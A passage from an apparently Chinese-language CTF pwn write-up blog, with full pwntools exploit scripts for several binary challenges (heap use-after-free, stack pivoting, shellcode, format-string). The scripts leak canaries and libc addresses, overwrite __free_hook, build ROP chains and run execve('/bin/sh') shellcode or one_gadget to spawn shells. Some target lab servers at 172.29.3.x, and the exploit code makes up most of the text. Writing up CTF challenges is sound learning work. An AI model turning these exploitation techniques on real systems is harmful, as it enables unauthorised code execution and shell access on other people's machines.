msg(msg,addr):</span><br><span class="line">    log.warn(msg+&quot;-&gt;&quot;+hex(addr))</span><br><span class="line">#-------------------------------------</span><br><span class="line">def new(size,name,call):</span><br><span class="line">    ru(&quot;choice:&quot;)</span><br><span class="line">    sl(&quot;1&quot;)</span><br><span class="line">    ru(&quot;Please input the size of compary&#x27;s name\n&quot;)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(&quot;please input name:\n&quot;)</span><br><span class="line">    sd(name)</span><br><span class="line">    ru(&quot;please input compary call:\n&quot;)</span><br><span class="line">    sd(call)</span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">    ru(&quot;choice:&quot;)</span><br><span class="line">    sl(&quot;3&quot;)</span><br><span class="line">    ru(&quot;Please input the index:\n&quot;)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line">def show(size):</span><br><span class="line">    ru(&quot;choice:&quot;)</span><br><span class="line">    sl(&quot;2&quot;)</span><br><span class="line">    ru(&quot;Please input the index:\n&quot;)</span><br><span class="line">    sl(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exp1():</span><br><span class="line">    new(0x18,&quot;a&quot;*8,&quot;b&quot;*8)</span><br><span class="line">    new(0x100,&quot;a&quot;*8,&quot;b&quot;*8)</span><br><span class="line">    new(0x100,&quot;a&quot;*8,&quot;b&quot;*8)</span><br><span class="line">    #</span><br><span class="line">    free(0)</span><br><span class="line">    for x in range(8):</span><br><span class="line">        free(1)</span><br><span class="line">    new(0x100,&quot;c&quot;*8,&quot;d&quot;*8)#3</span><br><span class="line">    show(3)</span><br><span class="line">    ru(&quot;c&quot;*8)</span><br><span class="line">    libc.address = u64(p.recv(6).ljust(8,&quot;\x00&quot;))-88-8-0x10-libc.sym[&quot;__malloc_hook&quot;]</span><br><span class="line">    free_hook = libc.sym[&quot;__free_hook&quot;]</span><br><span class="line">    system = libc.sym[&quot;system&quot;]</span><br><span class="line">    msg(&quot;libc.address&quot;,libc.address)</span><br><span class="line">    new(0x50,&quot;a&quot;*8,&quot;b&quot;*8)#4</span><br><span class="line">    new(0x50,&quot;a&quot;*8,&quot;b&quot;*8)</span><br><span class="line">    new(0x50,&quot;a&quot;*8,&quot;b&quot;*8)</span><br><span class="line">    free(4)</span><br><span class="line">    free(4)</span><br><span class="line">    new(0x50,p64(free_hook),&quot;b&quot;*8)</span><br><span class="line">    #piedebug(0)</span><br><span class="line">    new(0x50,&quot;/bin/sh\x00&quot;,&quot;b&quot;*8)</span><br><span class="line">    new(0x50,p64(system),&quot;b&quot;*8)</span><br><span class="line">    #piedebug(0)</span><br><span class="line">    free(7)</span><br><span class="line">#   ru(&quot;choice:&quot;)</span><br><span class="line">#   sl(&quot;3&quot;)</span><br><span class="line">#   print p.recv()</span><br><span class="line">    getshell()</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    bin_elf = &quot;./pwn&quot;</span><br><span class="line">    elf = ELF(bin_elf)</span><br><span class="line">    context.binary=bin_elf</span><br><span class="line">    context.log_level = &quot;debug&quot;</span><br><span class="line">    if sys.argv[1] == &quot;r&quot;:</span><br><span class="line">        p = remote(&quot;172.29.3.117&quot;,9999)</span><br><span class="line">        libc = elf.libc</span><br><span class="line">    elif sys.argv[1] == &quot;l&quot;:</span><br><span class="line">        libc = elf.libc</span><br><span class="line">        p = process(bin_elf)</span><br><span class="line">    exp1()</span><br></pre></td></tr></table></figure>

<p>这个比之前做的 tcache 简单一些，很简单的 UAF 。但是我分析这个堆的时候很迷，怎么 bss 段的跑到堆上了，是我忘了点啥吗，很奇怪。</p>
<h2 id="pwn7"><a href="#pwn7" class="headerlink" title="pwn7"></a>pwn7</h2><blockquote>
<p>栈迁移</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">#encoding:utf-8</span><br><span class="line">#!/upr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">def piedebug(addr):</span><br><span class="line">    text_base = int(os.popen(&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;.format(p.pid)).readlines()[1],16)</span><br><span class="line">    log.info(&quot;elf_base:&#123;&#125;&quot;.format(hex(text_base)))</span><br><span class="line">    log.info(&quot;fake_heap:&#123;&#125;&quot;.format(hex(text_base + 0x202018)))</span><br><span class="line">    #log.info(&quot;get_array:&#123;&#125;&quot;.format(hex(text_base + 0x202140)))</span><br><span class="line">    if addr!=0:</span><br><span class="line">        gdb.attach(p,&#x27;b *&#123;&#125;&#x27;.format(hex(text_base+addr)))</span><br><span class="line">    else:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">#-------------------------------------</span><br><span class="line">def sl(s):</span><br><span class="line">    return p.sendline(s)</span><br><span class="line">def sd(s):</span><br><span class="line">    return p.send(s)</span><br><span class="line">def rc(timeout=0):</span><br><span class="line">    if timeout == 0:</span><br><span class="line">        return p.recv()</span><br><span class="line">    else:</span><br><span class="line">        return p.recv(timeout=timeout)</span><br><span class="line">def ru(s, timeout=0):</span><br><span class="line">    if timeout == 0:</span><br><span class="line">        return p.recvuntil(s)</span><br><span class="line">    else:</span><br><span class="line">        return p.recvuntil(s, timeout=timeout)</span><br><span class="line">def sla(p,a,s):</span><br><span class="line">    return p.sendlineafter(a,s)</span><br><span class="line">def sda(a,s):</span><br><span class="line">    return p.sendafter(a,s)</span><br><span class="line">def debug(addr=&#x27;&#x27;):</span><br><span class="line">    gdb.attach(p,addr)</span><br><span class="line">    pause()</span><br><span class="line">def getshell():</span><br><span class="line">    p.interactive()</span><br><span class="line">def msg(msg,addr):</span><br><span class="line">    log.warn(msg+&quot;-&gt;&quot;+hex(addr))</span><br><span class="line">#-------------------------------------</span><br><span class="line">def exp():</span><br><span class="line">    name =&quot;admin&quot;</span><br><span class="line">    new = &quot;&quot;</span><br><span class="line">    for i in range(len(name)):</span><br><span class="line">        new+=chr(ord(name[i])^i)</span><br><span class="line"></span><br><span class="line">    piedebug(0x0118A)</span><br><span class="line">    ru(&quot;please input your name\n&quot;)</span><br><span class="line">    sl(new)</span><br><span class="line">    ru(&quot;do you want to get something???\n&quot;)</span><br><span class="line"></span><br><span class="line">    sd(&quot;a&quot;*0x19)</span><br><span class="line">    ru(&quot;a&quot;*0x18)</span><br><span class="line">    canary = u64(p.recv(8))-0x61</span><br><span class="line">    stack = u64(p.recv(6).ljust(8,&quot;\x00&quot;))-0x28</span><br><span class="line">    msg(&quot;canary&quot;,canary)</span><br><span class="line">    msg(&quot;stack&quot;,stack)</span><br><span class="line">    ru(&quot;OK???\n&quot;)</span><br><span class="line">    sd(&quot;b&quot;*0x18+p64(canary))</span><br><span class="line"></span><br><span class="line">    ru(&quot;I think you can do something now\n&quot;)</span><br><span class="line">    pay = &quot;c&quot;*0x18+&quot;a&quot;*0x10+p64(canary)+&quot;a&quot;*8+&quot;\xde\x50&quot;#1/16</span><br><span class="line">    #pay = &quot;%7$p%8$p%9$p&quot;.ljust(0x18,&quot;\x00&quot;)+p64(canary)*4+&quot;\xa2\x11&quot;#1/16</span><br><span class="line">    sd(pay)</span><br><span class="line">    #print p.recv()</span><br><span class="line"></span><br><span class="line">    ru(&quot;do you want to get something???\n&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sd(&quot;a&quot;*0x21)</span><br><span class="line">    ru(&quot;OK???\n&quot;)</span><br><span class="line">    sd(&quot;b&quot;*0x29)</span><br><span class="line">    ru(&quot;a&quot;*8)</span><br><span class="line">    piebase = u64(p.recv(6).ljust(8,&quot;\x00&quot;))-0x1440</span><br><span class="line">    msg(&quot;piebase&quot;,piebase)</span><br><span class="line">    printf_got=elf.got[&quot;printf&quot;]+piebase</span><br><span class="line">    printf_plt=elf.plt[&quot;printf&quot;]+piebase</span><br><span class="line">    read_got=elf.got[&quot;read&quot;]+piebase</span><br><span class="line">    pop_rdi_ret=piebase+0x14a3</span><br><span class="line">    leave_ret=piebase+0x10dc</span><br><span class="line">    vul = piebase+0x10de</span><br><span class="line">    msg(&quot;printf_got&quot;,printf_got)</span><br><span class="line">    msg(&quot;printf_plt&quot;,printf_plt)</span><br><span class="line">    msg(&quot;read_got&quot;,read_got)</span><br><span class="line"></span><br><span class="line">    ru(&quot;I think you can do something now\n&quot;)</span><br><span class="line">    gadget = &quot;a&quot;*0x8+p64(pop_rdi_ret)+p64(read_got)+p64(printf_plt)</span><br><span class="line">    pay = gadget+p64(vul)+p64(canary)+p64(stack)+p64(leave_ret)</span><br><span class="line">    sd(pay)</span><br><span class="line">    libc.address = u64(p.recv(6).ljust(8,&quot;\x00&quot;))-libc.sym[&quot;read&quot;]</span><br><span class="line">    system = libc.sym[&quot;system&quot;]</span><br><span class="line">    msg(&quot;libc.address&quot;,libc.address)</span><br><span class="line"></span><br><span class="line">    ru(&quot;do you want to get something???\n&quot;)</span><br><span class="line">    #piedebug(0x11fe)</span><br><span class="line">    sd(&quot;a&quot;*0x8)</span><br><span class="line">    ru(&quot;OK???\n&quot;)</span><br><span class="line">    sd(&quot;b&quot;*0x8)</span><br><span class="line">    ru(&quot;I think you can do something now\n&quot;)</span><br><span class="line">    gadget = &quot;/bin/sh\x00&quot;+p64(pop_rdi_ret)+p64(stack)+p64(system)</span><br><span class="line">    pay = gadget+p64(0)+p64(canary)+p64(stack-0x10)+p64(leave_ret)</span><br><span class="line">    sd(pay)</span><br><span class="line">    getshell()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    bin_elf = &quot;./pwn&quot;</span><br><span class="line">    elf = ELF(bin_elf)</span><br><span class="line">    context.binary=bin_elf</span><br><span class="line">    context.log_level = &quot;debug&quot;</span><br><span class="line">    #context.terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">    if sys.argv[1] == &quot;r&quot;:</span><br><span class="line">        p = remote(&quot;172.29.3.118&quot;,9999)</span><br><span class="line">        libc = elf.libc</span><br><span class="line">    elif sys.argv[1] == &quot;l&quot;:</span><br><span class="line">        libc = elf.libc</span><br><span class="line">        #取消aslr保护机制</span><br><span class="line">        #p = process(bin_elf, aslr=0)</span><br><span class="line">        #加入libc进行调试：</span><br><span class="line">        #p = process(bin_elf,env = &#123;&quot;LD_PRELOAD&quot;: &quot;../libc-2.23.so.i386&quot;&#125;)</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        try:</span><br><span class="line">            p = process(bin_elf)</span><br><span class="line">            exp()</span><br><span class="line">        except:</span><br><span class="line">            p.close()</span><br></pre></td></tr></table></figure>

<p>这道题我在调试的时候遇到问题很多,在线解决.不过把师傅思路整明白了,首先通过过 printf 把 canary 带出来,之后碰运气撞出来 <code>sub_10DE</code> ,之后再来一遍,把 pie 泄漏出来,最后泄漏一个 read 函数把 libc 整出来,最后起 shell ,我在几个具体构造还不太明白,赶紧整</p>
<h2 id="lab6"><a href="#lab6" class="headerlink" title="lab6"></a>lab6</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import time</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">r = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_plt = 0x8048380</span><br><span class="line">puts_plt = 0x8048390</span><br><span class="line">leave_ret = 0x08048418</span><br><span class="line">pop_edx_ret = 0x0804836d</span><br><span class="line">puts_got = 0x8049ff0</span><br><span class="line">buf = 0x0804b000-0x200</span><br><span class="line">buf2 = buf + 0x100</span><br><span class="line">payload = &quot;a&quot;*40</span><br><span class="line">payload += flat([buf,read_plt,leave_ret,0,buf,100])</span><br><span class="line">r.recvuntil(&quot;:&quot;)</span><br><span class="line">r.send(payload)</span><br><span class="line">time.sleep(0.1)</span><br><span class="line"></span><br><span class="line">rop = flat([buf2,puts_plt,pop_edx_ret,puts_got,read_plt,leave_ret,0,buf2,100])</span><br><span class="line"></span><br><span class="line">r.sendline(rop)</span><br><span class="line">r.recvuntil(&quot;\n&quot;)</span><br><span class="line">puts_off = 0x5fca0</span><br><span class="line">libc = u32(r.recv(4)) - puts_off</span><br><span class="line">print &quot;libc:&quot;,hex(libc)</span><br><span class="line">time.sleep(0.1)</span><br><span class="line">system_off = 0x3ada0</span><br><span class="line">system = libc + system_off</span><br><span class="line">rop2 = flat([buf,system,0,buf2+4*4,&quot;/bin/sh&quot;])</span><br><span class="line">r.sendline(rop2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>堆栈迁移,上题引申出来的,发现自己完全忘记了,赶紧看了看,终于懂了,我发现我之前理解错了,或者说理解的很浅, tcl .这题关键是溢出字节太少了,需要去做一个迁移,所以就做了 2 个手脚来 read 输入.发现 32 位和 64 位比起来是真简单,和自己用 exp 写东西一样,2333,难度层面简直是弟弟</p>
<p>尴尬了,今天深入从汇编层面想了想,发现我真的理解错了,啊~~~ 简单说一下.第一次 payload 的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &quot;a&quot;*40</span><br><span class="line">payload += flat([buf,read_plt,leave_ret,0,buf,100])</span><br></pre></td></tr></table></figure>

<p>首先执行 read 函数,后边 3 个参数,之后顺序往下执行,又因为 ebp 一直指向 buf ,所以 ebp 去 buf 了, esp 指向哪呢??对,这就是我之前理解的,现在想想,我是把汇编层面的东西自己理解的有点偏差,应该是这样</p>
<p>首先的 buf 应该首先被 leave 出去,这样 ebp 就指向了 buf , esp 指向 read ,后边顺序执行,之后到了 leave 后我们的 esp 就理所应当的被迁移到了 buf 处,这才是正确的理解, orz</p>
<h2 id="pwn9"><a href="#pwn9" class="headerlink" title="pwn9"></a>pwn9</h2><blockquote>
<p>小知识点,直接写 shellcode</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">#encoding:utf-8</span><br><span class="line">#!/upr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">def sl(s):</span><br><span class="line">    return p.sendline(s)</span><br><span class="line">def sd(s):</span><br><span class="line">    return p.send(s)</span><br><span class="line">def rc(timeout=0):</span><br><span class="line">    if timeout == 0:</span><br><span class="line">        return p.recv()</span><br><span class="line">    else:</span><br><span class="line">        return p.recv(timeout=timeout)</span><br><span class="line">def ru(s, timeout=0):</span><br><span class="line">    if timeout == 0:</span><br><span class="line">        return p.recvuntil(s)</span><br><span class="line">    else:</span><br><span class="line">        return p.recvuntil(s, timeout=timeout)</span><br><span class="line">def sla(p,a,s):</span><br><span class="line">    return p.sendlineafter(a,s)</span><br><span class="line">def sda(a,s):</span><br><span class="line">    return p.sendafter(a,s)</span><br><span class="line">def debug(addr=&#x27;&#x27;):</span><br><span class="line">    gdb.attach(p,addr)</span><br><span class="line">    pause()</span><br><span class="line">def getshell():</span><br><span class="line">    p.interactive()</span><br><span class="line">def msg(msg,addr):</span><br><span class="line">    log.warn(msg+&quot;-&gt;&quot;+hex(addr))</span><br><span class="line">#-------------------------------------</span><br><span class="line">def exp():</span><br><span class="line">    jmp = 0x08048554</span><br><span class="line">    shellcode =&#x27;&#x27;&#x27;</span><br><span class="line">    xor    eax,eax</span><br><span class="line">    push   eax</span><br><span class="line">    push   0x68732f2f</span><br><span class="line">    push   0x6e69622f</span><br><span class="line">    mov    ebx,esp</span><br><span class="line">    mov    ecx,eax</span><br><span class="line">    mov    edx,eax</span><br><span class="line">    mov    al,0xb</span><br><span class="line">    int    0x80</span><br><span class="line">    xor    eax,eax</span><br><span class="line">    inc    eax</span><br><span class="line">    int    0x80</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    shellcode =asm(shellcode)</span><br><span class="line">    shell=&quot;sub esp,0x28;call esp&quot;</span><br><span class="line">    shell =asm(shell)</span><br><span class="line">    ru(&quot;&gt;\n&quot;)</span><br><span class="line">    pay = shellcode.ljust(0x24,&quot;\x00&quot;)</span><br><span class="line">    pay+= p32(jmp)</span><br><span class="line">    pay+=shell</span><br><span class="line">    #debug(&quot;b *0x8048554&quot;)</span><br><span class="line">    sl(pay)</span><br><span class="line">    getshell()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    bin_elf = &quot;./pwn&quot;</span><br><span class="line">    elf = ELF(bin_elf)</span><br><span class="line">    context.binary=bin_elf</span><br><span class="line">    #context.log_level = &quot;debug&quot;</span><br><span class="line">    #context.terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">    if sys.argv[1] == &quot;r&quot;:</span><br><span class="line">        p = remote(&quot;172.29.3.120&quot;,9999)</span><br><span class="line">        libc = elf.libc</span><br><span class="line">    elif sys.argv[1] == &quot;l&quot;:</span><br><span class="line">        libc = elf.libc</span><br><span class="line">        p = process(bin_elf)</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>这个就是最简单的往栈里写东西了,连 nx 也关了,这是什么题~~ 不过我发现 wp 和我想得不太一样,师傅先去 <code>jump esp</code> ,然后利用 <code>sub esp,0x28;call esp</code> 起的 shell ,我感觉有点头皮发麻,突然发现我之前整的直接跳到 buf 处必须关 aslr ,学到了学到了~~~~ 下面简单说一下思路:</p>
<p>构造情况<code>shellcode + jmp + shell</code> ,到 jmp 的时候 esp 在 shell ,所以直接 esp 减 0x24+4 就好了,之后就是我们希望的执行了~~~</p>
<h2 id="story"><a href="#story" class="headerlink" title="story"></a>story</h2><blockquote>
<p>来自西湖论剑</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p= process(&#x27;story&#x27;)</span><br><span class="line">#p=remote(&#x27;ctf2.linkedbyx.com&#x27;,10895)</span><br><span class="line">libc = ELF(&#x27;./libc-2.23.so&#x27;)</span><br><span class="line">p.sendline(&quot;%15$p%25$p&quot;)</span><br><span class="line">p.recvuntil(&quot;0x&quot;)</span><br><span class="line"></span><br><span class="line">canary = int(p.recvuntil(&quot;0x&quot;)[:-2],16)</span><br><span class="line">info(&quot;canary:0x%x&quot;,canary)</span><br><span class="line">addr = int(p.recvuntil(&#x27;\n&#x27;)[:-1],16)</span><br><span class="line">libc_base = addr - libc.symbols[&#x27;__libc_start_main&#x27;]-0xf0</span><br><span class="line">info(&quot;libc:0x%x&quot;,libc_base)</span><br><span class="line">one = libc_base+0xf1147</span><br><span class="line">pay = (0x808-0x780)*&#x27;\x00&#x27;+p64(canary)+p64(0)+p64(one)+&#x27;\x00&#x27;*400</span><br><span class="line">p.recvuntil(&#x27;story&#x27;)</span><br><span class="line">p.sendline(&#x27;200&#x27;)</span><br><span class="line">p.recvuntil(&#x27;story&#x27;)</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>简单的格式化字符串洞,完全忘记了,简单记录一下怎么找的偏移</p>
<p>先暴力输入一堆<code>%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.</code>然后找偏移,如果有结尾 00 的可以注意一下,然后用 cyclic 加猜测的偏移确定,我是这样的,不知道师傅们怎么确定的,知道 canary 后用 gdb 就能确定 <code>__libc_start_main+240</code> 的偏移,这就简单了.之后填入 one_gadget 完事~~~ ,对,这里记录一下 one_gadget 的骚操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">☁  xihulunjian  one_gadget libc-2.23.so </span><br><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure>

<p>这时摆出来的限制情况,我发现师傅 tql ,他根据输入精准控制栈的情况</p>
<h2 id="noinfoleak"><a href="#noinfoleak" class="headerlink" title="noinfoleak"></a>noinfoleak</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r = process(&#x27;./noinfoleak&#x27;)</span><br><span class="line">elf = ELF(&#x27;noinfoleak&#x27;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;, checksec=False)</span><br><span class="line">#gdb.attach(r, gdbscript=&#x27;b *0x00400AC7\nc\n&#x27;)</span><br><span class="line"></span><br><span class="line">def add(size, data):</span><br><span class="line">    r.sendlineafter(&#x27;&gt;&#x27;, &#x27;1&#x27;)</span><br><span class="line">    r.sendlineafter(&#x27;&gt;&#x27;, str(size))</span><br><span class="line">    r.sendlineafter(&#x27;&gt;&#x27;, data)</span><br><span class="line">def delete(index):</span><br><span class="line">    r.sendlineafter(&#x27;&gt;&#x27;, &#x27;2&#x27;)</span><br><span class="line">    r.sendlineafter(&#x27;&gt;&#x27;, str(index))</span><br><span class="line">def edit(index, data):</span><br><span class="line">    r.sendlineafter(&#x27;&gt;&#x27;, &#x27;3&#x27;)</span><br><span class="line">    r.sendlineafter(&#x27;&gt;&#x27;, str(index))</span><br><span class="line">    r.sendafter(&#x27;&gt;&#x27;, data)</span><br><span class="line"></span><br><span class="line">add(0x30, &#x27;/bin/sh&#x27;)</span><br><span class="line">add(0x20, &#x27;AAA&#x27;)</span><br><span class="line">add(0x20, &#x27;BBB&#x27;)</span><br><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line">delete(1)</span><br><span class="line">arrAddr = 0x06010A0</span><br><span class="line">freeGotAddr = elf.got[&#x27;free&#x27;]</span><br><span class="line">putsPltAddr = 